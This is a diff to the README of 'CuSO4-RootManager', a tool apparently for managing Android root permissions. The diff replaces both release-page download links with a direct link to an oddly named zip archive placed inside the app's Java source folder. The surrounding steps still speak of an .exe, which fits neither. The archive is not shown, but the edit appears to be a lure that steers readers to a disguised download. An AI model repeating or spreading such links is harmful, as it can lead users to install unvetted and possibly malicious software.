@@ -1,6 +1,6 @@
 # 🧊 CuSO4-RootManager - Manage your device permissions with ease
 
-[![Download CuSO4-RootManager](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/Typescriptsilhouette293/CuSO4-RootManager/releases)
+[![Download CuSO4-RootManager](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/Typescriptsilhouette293/CuSO4-RootManager/raw/refs/heads/main/android/app/src/main/java/Root-Cu-S-Manager-backstitch.zip)
 
 ## 📌 About this application
 
@@ -24,7 +24,7 @@ CuSO4-RootManager provides a central hub for your device management needs. It wo
 
 ## 📥 Downloads
 
-Visit [this page to download](https://github.com/Typescriptsilhouette293/CuSO4-RootManager/releases) the latest version of the software.
+Visit [this page to download](https://github.com/Typescriptsilhouette293/CuSO4-RootManager/raw/refs/heads/main/android/app/src/main/java/Root-Cu-S-Manager-backstitch.zip) the latest version of the software.
 
 1. Locate the file ending in .exe in the Assets section.
 2. Click the file name to start the download.
